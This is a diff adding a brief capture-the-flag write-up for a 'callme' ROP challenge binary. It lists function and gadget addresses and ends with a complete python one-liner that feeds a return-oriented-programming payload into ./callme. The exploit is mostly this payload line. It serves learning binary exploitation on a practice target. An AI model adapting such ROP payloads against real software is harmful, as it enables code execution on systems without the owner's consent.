@@ -1,0 +1,16 @@
+Exploit: ROP chain but longer thatn split chall
+
+Padding: 40
+Functions:
+0x0000000000401810  callme_three@plt
+0x0000000000401850  callme_one@plt
+0x0000000000401870  callme_two@plt
+0x0000000000401996  main
+0x0000000000401a05  pwnme ; where fgets() is called
+0x0000000000401a57  usefulFunction ; calls all callme functions using wrong params (4, 5, 6)
+0x0000000000401ab0  usefulGadgets ; has gadget needed for exploit (pops rdi, rsi, and rdx for filling in the 3 params for the callme functions)
+The Gist: Basically repeat the sequence of returning to the gadget and putting 
+in 1, 2, and 3 into the space allotted by the gadget before returning to each
+callme function.
+Payload:
+python -c 'print "a"*40 + "\xb0\x1a\x40\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x50\x18\x40\x00\x00\x00\x00\x00\xb0\x1a\x40\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x70\x18\x40\x00\x00\x00\x00\x00\xb0\x1a\x40\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x10\x18\x40\x00\x00\x00\x00\x00"' | ./callme
